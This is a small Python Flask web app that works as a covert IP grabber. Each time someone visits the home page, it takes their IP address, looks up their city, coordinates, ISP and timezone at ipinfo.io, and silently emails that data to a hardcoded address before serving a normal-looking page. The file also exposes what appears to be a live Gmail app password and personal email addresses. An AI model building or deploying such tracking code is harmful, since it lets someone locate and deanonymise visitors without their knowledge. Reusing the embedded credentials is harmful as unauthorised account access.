from flask import Flask, request, render_template
import requests
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

# Email settings
YOUR_EMAIL = "kiksymyguy@gmail.com"
YOUR_APP_PASSWORD = "axie xddp ltxy lwdi"
SEND_TO_EMAIL = "samuel.akinola@rocketmail.com"

def send_email(subject, body):
    msg = EmailMessage()
    msg.set_content(body)
    msg["Subject"] = subject
    msg["From"] = YOUR_EMAIL
    msg["To"] = SEND_TO_EMAIL

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(YOUR_EMAIL, YOUR_APP_PASSWORD)
        smtp.send_message(msg)

@app.route('/')
def home():
    # Get the real IP if behind a proxy (like Render)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    location_data = {}

    try:
        response = requests.get(f"https://ipinfo.io/{user_ip}/json")
        location_data = response.json()
    except Exception as e:
        location_data = {"error": str(e)}

    # Compose email content
    body = f"""
    Visitor IP: {user_ip}
    City: {location_data.get('city')}
    Region: {location_data.get('region')}
    Country: {location_data.get('country')}
    Coordinates: {location_data.get('loc')}
    ISP: {location_data.get('org')}
    Timezone: {location_data.get('timezone')}
    """

    send_email("New Visitor Location", body)

    return render_template("index.html")
